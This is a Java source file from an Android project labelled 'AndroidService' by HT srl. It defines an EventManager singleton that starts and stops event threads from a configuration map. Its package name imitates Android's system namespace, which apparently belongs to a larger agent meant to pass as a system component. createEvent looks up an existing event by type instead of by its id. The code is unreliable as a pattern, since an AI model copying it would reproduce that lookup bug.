/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import com.android.service.Manager;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public class EventManager extends Manager<EventBase, Integer, EventType> {
	/** The Constant TAG. */
	private static final String TAG = "EventManager";

	/** The singleton. */
	private volatile static EventManager singleton;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static EventManager self() {
		if (singleton == null) {
			synchronized (EventManager.class) {
				if (singleton == null) {
					singleton = new EventManager();
					singleton.setFactory(new EventFactory());
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase createEvent(final EventType type, final EventConf conf) {

		if (running.containsKey(conf.getId()) == true) {
			return (EventBase) running.get(type);
		}

		EventBase e = factory.create(type);

		if (e != null) {
			running.put(conf.getId(), e);
		}

		return e;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	public boolean startAll() {
		HashMap<Integer, EventConf> events;

		events = status.getEventsMap();

		if (events == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Events map null");
			return false;
		}

		if (running == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Running Events map null");
			return false;
		}

		final Iterator<Map.Entry<Integer, EventConf>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventConf> pairs = it.next();

			final EventConf conf = pairs.getValue();
			final EventType type = conf.getType();
			if(Cfg.DEBUG) Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");

			final EventBase e = createEvent(type, conf);

			if (e != null) {
				e.parse(conf);

				if (!e.isRunning()) {
					final Thread t = new Thread(e);
					if (Cfg.DEBUG) {
						t.setName(e.getClass().getSimpleName());
					}
					t.start();
					if(Cfg.DEBUG) Check.log( TAG + " (startAll): " + e);
					threads.put(e, t);
				} else {
					if(Cfg.DEBUG) Check.log( TAG + " Warn: event already running");
				}
			}
		}

		return true;
	}

	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	/**
	 * Stop events.
	 */
	public void stopAll() {
		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventBase> pairs = it.next();
			final EventBase event = pairs.getValue();

			if(Cfg.DEBUG) Check.log( TAG + " Stopping: " + event);

			if (event.isRunning()) {
				event.stopThread();

				try {
					final Thread t = (Thread) threads.get(event);
					if(Cfg.DEBUG) Check.asserts(t != null, "Null thread");

					t.join();
					threads.remove(event);

				} catch (final InterruptedException e) {
					if(Cfg.DEBUG) { Check.log(e); }
					if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
				}
			} else {
				if(Cfg.DEBUG) Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
			}

		}

		if(Cfg.DEBUG) Check.ensures(threads.size() == 0, "Non empty threads");
		if(Cfg.DEBUG) Check.ensures(running.size() == 0, "Non empty running");

		running.clear();
		threads.clear();
	}

	@Override
	public void start(Integer key) {

	}

	@Override
	public void stop(Integer key) {

	}
}
